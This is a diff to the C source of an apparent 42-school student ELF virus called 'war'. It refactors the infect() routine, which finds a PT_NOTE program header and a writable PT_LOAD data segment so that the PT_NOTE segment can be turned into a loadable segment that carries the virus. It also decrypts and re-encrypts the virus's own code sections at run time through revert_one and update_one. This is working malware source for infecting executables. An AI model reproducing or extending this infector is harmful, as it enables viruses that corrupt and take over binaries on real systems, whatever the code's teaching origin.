@@ -6,26 +6,45 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/12 17:18:22 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/12 20:34:03 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "war.h"
 
 /*
-  Infect modify binary header and segment. it transform PT_NOTE into PT_LOAD
+  Infect() modify binary header and segment. it transform PT_NOTE into PT_LOAD
 */
-void		infect(t_data *data)
+
+__INLINE__ static Elf64_Phdr	*get_segment(t_data *data, register int off)
+{
+	Elf64_Phdr *ret;
+
+   ret = (Elf64_Phdr*)(data->bin.map + (data->header->e_phoff + sizeof(Elf64_Phdr) * off));
+	if (!ret || (void*)ret >= (void*)data->bin.map + data->bin.size)
+		return (NULL);
+	return (ret);
+}
+
+__INLINE__ static bool	is_ptnote(Elf64_Phdr *hdr)
+{
+	return (hdr->p_type == PT_NOTE);
+}
+
+__INLINE__ static bool	is_data(Elf64_Phdr *hdr)
+{
+	return ((hdr->p_type == PT_LOAD) && (hdr->p_flags == (PF_W | PF_R)));
+}
+
+void	infect(t_data *data)
 {
 
-	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
-
 #ifdef DEBUG
-	char de[] = "infect\t\t0\n";
-	data->context == true ?	de[8] = 49 : 0;
-	_log(de, _strlen(de));
+	char log[] = "infect\t\t";
+	_log(log, NULL, 8, data->context);
 #endif
 
+	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
 	if (data->context == false)
 		goto next;
 
@@ -33,17 +52,18 @@ void		infect(t_data *data)
 	Elf64_Phdr  *tmp = NULL;
 	for (register int off = 0 ; off < data->header->e_phnum ; off++)
 	{
-		tmp = (Elf64_Phdr*)((char*)data->bin.map + (data->header->e_phoff + sizeof(Elf64_Phdr) * off));
-		if (!tmp || (void*)tmp >= (void*)data->bin.map + data->bin.size)
+
+		if (!(tmp = get_segment(data, off)))
 			goto next;
-		if (tmp->p_type == PT_NOTE)
+		if (is_ptnote(tmp) == true)
 			data->virus.note = tmp;
-		if ((tmp->p_type == PT_LOAD) && (tmp->p_flags == (PF_W | PF_R)))
+		if (is_data(tmp) == true)
 			data->virus.data = tmp;
 	}
 
 	if (data->virus.note == NULL || data->virus.data == NULL)
 		goto next;
+
 	size_t base = data->virus.data->p_vaddr + data->virus.data->p_memsz;
 	size_t padd = base % data->virus.data->p_align;
 
@@ -71,6 +91,5 @@ next:
 
 	update_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
 	revert_one(&data->key, (char*)inject, (size_t)patch - (size_t)inject);
-
 	inject(data);
 }
